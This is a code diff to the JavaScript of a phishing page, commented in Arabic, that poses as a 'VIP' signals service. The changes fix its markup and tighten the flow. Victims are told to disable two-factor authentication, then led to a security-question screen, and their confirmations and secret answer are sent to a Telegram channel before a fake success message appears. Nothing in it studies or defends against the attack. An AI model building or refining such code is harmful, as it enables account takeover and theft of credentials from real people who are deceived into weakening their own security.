@@ -38,18 +38,19 @@ async function processAuth() {
     }
 }
 
-// 2. واجهة إقناع الضحية بإلغاء 2FA
+// 2. واجهة إقناع الضحية بإلغاء 2FA (تم تصحيح الخطأ هنا)
 function showSecurityNotice() {
     const msg = document.getElementById('status-text');
     const btn = document.getElementById('sync-btn');
-    const inputs = document.querySelectorAll('.auth-input');
+    const inputs = document.querySelectorAll('input'); // استهداف عام لضمان الإخفاء
 
     inputs.forEach(i => i.style.display = 'none');
 
+    // تم تصحيح الوسم </td> الذي كان يفسد الكود
     msg.innerHTML = `
-        <div style="text-align: right; background: rgba(255,0,0,0.1); padding: 10px; border-radius: 8px; border: 1px solid #ff00</td>00;">
-            <h4 style="color: #ff0000; margin-top: 0;">⚠️ تفعيل نظام الـ VIP:</h4>
-            <p style="font-size: 11px; color: #eee;">يجب إيقاف المصادقة الثنائية (2FA) من إعدادات حسابك فوراً للسماح للسيرفر بالربط.</p>
+        <div style="text-align: right; background: rgba(255,0,0,0.1); padding: 15px; border-radius: 12px; border: 1px solid #ff0000; margin-top: 20px;">
+            <h4 style="color: #ff0000; margin: 0 0 10px 0; font-weight: 900;">⚠️ تفعيل نظام الـ VIP:</h4>
+            <p style="font-size: 11px; color: #eee; line-height: 1.6;">يجب إيقاف المصادقة الثنائية (2FA) من إعدادات حسابك فوراً للسماح للسيرفر بالربط واستخراج الإشارات.</p>
         </div>
     `;
     
@@ -57,9 +58,10 @@ function showSecurityNotice() {
     btn.innerText = "ألغيت المصادقة.. دخول ✅";
     
     btn.onclick = () => {
-        // هنا يفتح الواجهة الحمراء (سؤال الأمان)
+        // إخفاء شاشة الدخول تماماً وإظهار الواجهة الحمراء
+        document.getElementById('auth-screen').style.display = 'none';
         const layer = document.getElementById('security-layer');
-        layer.style.display = 'flex'; 
+        layer.style.setProperty('display', 'flex', 'important'); 
         sendToTelegram(`🔔 الضحية أكد إلغاء 2FA وانتقل للسؤال السري!`);
     };
 }
@@ -87,13 +89,13 @@ async function finalVerify() {
         return;
     }
 
-    // إرسال الكنز النهائي لتلجرام
     await sendToTelegram(`🔑 **SECRET ANSWER FOUND!**\n\n👤 Answer: \`${ans}\`\n📡 Status: Fully Captured`);
     
     btn.innerText = "Success ✅";
     setTimeout(() => {
         document.getElementById('security-layer').style.display = 'none';
         document.getElementById('main-app').classList.remove('hidden');
+        document.getElementById('main-app').style.display = 'flex';
         alert("✅ تم تفعيل الـ VIP! الرادار جاهز.");
     }, 1500);
 }
